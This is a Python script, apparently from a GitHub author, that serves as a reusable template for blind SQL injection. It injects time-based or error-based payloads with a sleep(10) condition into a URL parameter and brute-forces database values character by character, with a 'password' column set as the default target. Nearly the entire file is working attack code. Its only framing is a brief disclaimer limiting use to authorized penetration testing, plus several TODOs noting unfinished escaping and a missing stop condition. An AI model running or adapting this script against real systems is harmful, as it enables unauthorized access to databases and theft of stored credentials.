# Author: 0xalwayslucky (https://github.com/0xalwayslucky)
#
# This script should be used for authorized penetration testing purposes only.
# Any misuse will not be the responsibility of the author and thus the author can't
# be held liable for any damages arising from this software
import requests
from urllib.parse import unquote, quote_plus

target = 'http://'


# sample for session generation
def build_session():
    url = target + ''
    resp = requests.get(url)
    cookie = resp.headers['Set-Cookie']
    session = cookie.split(';')[0]  # change this depening on whats needed
    return session


# sample for pre-sqli requirements
def pre_sqli(value):
    resp = requests.get(target, headers={'Cookie': value}, allow_redirects=False)
    return resp


# print headers and text of response
def print_response(resp):
    print(resp.headers)
    print(resp.text)


# Todo: escaping isn't dont properly yet, may break stuff when performing the request (special chars)
# change the current character thats asked for in blind sqli queries
# if a string of characters is provided the last character of the string will be changed
def change_char(string):
    charset_upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    charset_lower = 'abcdefghijklmnopqrstuvwxyz'
    charset_numbers = '1234567890'
    charset_symbols = '!$&()*+,-./:;<=>?@[]^{|}~_%'  # removed \ ' and "; see Todo

    # charset to ask for in sqli queries
    charset = charset_lower + charset_upper + charset_numbers + charset_symbols

    if string == '':
        return charset[0]

    # loop through the charset and replace the last character of the given string with the next character in the charset
    for i in range(len(charset)):
        if charset[i] == string[-1:len(string)]:
            # if the last character in the charset is reached the given character will be replaced by the first one of the charset
            if len(charset)-1 == i:
                return string[0:-1] + 'A'
            i = i + 1
            return string[0:-1] + charset[i]


# split string into list of chars
def split(word):
    return [char for char in word]


# main template to exploit the blind sqli (currently time based and error based)
# reads values char by char from a database
def exploit_blind_sqli():
    target_injectable = '?param1={}'                    # parameter to inject the query into
    sqli_type = 'time'                                  # type of the sqli to exploit

    # query variables & query
    query_pre = '\\\''                                    # could be something like: '\\\'union ', 'and 1 = ', 'and 1=2; '
    query_post = ';-- -'                                # could be something like: ';--', ';/*', ';-- -'
    query_column = 'password'                           # table column to query
    query_table = 'table'                               # table to query
    query_substring_pos = 1                             # start position for the substring
    query_limit = 'limit 1, 1'                          # used to select the row e.g. limit 5, 1 => 5 = offset, 1 = row_count => select 5th row
    query_sleep = 'sleep(10)'                           # if the query fails sleep for x seconds

    query = f'{query_pre}if((select substring({query_column},{0},1) from {query_table} {query_limit}) like \'{1}%\', 1, {query_sleep}){query_post}'

    # time based sqli fail condition
    timeout = 1                                         # http timeout to indicated unsuccessful sqli exploitation
                                                        # request will throw exception after seconds specified

    # error based sqli success condition
    sqli_success_code = 200                             # http status code to indicate successful sqli exploitation

    # temporary results
    current_char = change_char('')                      # this is the character that will be asked for
                                                        # empty string means get first one of charset
    current_result = ''                                 # string of the already brute-forced characters
    output_result = f'[{0}] \tcurrent result: \t{1}'    # current result of the brute-forced string

    # Todo: break condition is missing / has to be interrupted manually
    # Todo: this probably can be done with an "ask-query" e.g. !if row contains more chars: break
    # Todo: reason for a query and not a "charset based" condition is that connection errors could lead to false results
    # Todo: thus a better (but more noisy) way to do it is asking the sql server if there are more chars
    # Todo: however this would be very specific for the "read chars from database exploitation"
    while 1:
        if sqli_type == 'time':
            payload = query.format(query_substring_pos, quote_plus(current_char))  # change this based on query
            try:
                resp = requests.get(target + target_injectable.format(payload), timeout=timeout)
            except requests.exceptions.Timeout:
                current_char = change_char(current_char)
                continue
        elif sqli_type == 'error':
            payload = query.format(query_substring_pos, quote_plus(current_char))  # change this based on query
            resp = requests.get(target + target_injectable.format(payload), timeout=timeout)
            if resp.status_code != sqli_success_code:
                current_char = change_char(current_char)
                continue

        current_result += current_char
        print(output_result.format(query_substring_pos, current_result))
        query_substring_pos = query_substring_pos + 1
        current_char = 'A'


if __name__ == "__main__":
    exploit_blind_sqli()

